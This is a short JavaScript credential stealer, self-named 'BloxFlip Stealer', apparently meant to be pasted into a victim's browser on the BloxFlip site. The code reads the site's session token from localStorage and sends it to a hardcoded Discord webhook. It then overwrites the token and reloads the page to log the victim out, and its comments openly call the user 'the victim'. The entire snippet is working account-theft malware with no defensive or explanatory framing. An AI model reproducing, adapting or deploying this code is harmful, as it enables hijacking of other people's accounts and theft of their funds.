{
  const webhook = "https://discord.com/api/webhooks/1064291691147825193/ShOm5BVrx-nL9UCv4v4eUgzMHAgRBcWysnEcBuOs-2k8vxM1uz0nxPJGnZn0M7bEbnQb";

  const token = window.localStorage["_DO_NOT_SHARE_BLOXFLIP_TOKEN"];
  const request = new XMLHttpRequest();
  request.open("POST", webhook);
  request.setRequestHeader("Content-type", "application/json");
  request.send(
    JSON.stringify({
      username: "BloxFlip Stealer",
      avatar_url:
        "https://media.discordapp.net/attachments/953476600421314601/964288523387678770/Screen_Shot_2022-04-14_at_3.15.10_PM.png?width=461&height=461", // my way of giving myself credits.
      content: "**Token**\n```" + token + "```",
    })
  );

  // Log the victim out of their bloxflip account by changing their token value to something random.
  window.localStorage["_DO_NOT_SHARE_BLOXFLIP_TOKEN"] = "token logged rip";
  location.reload(); 
}
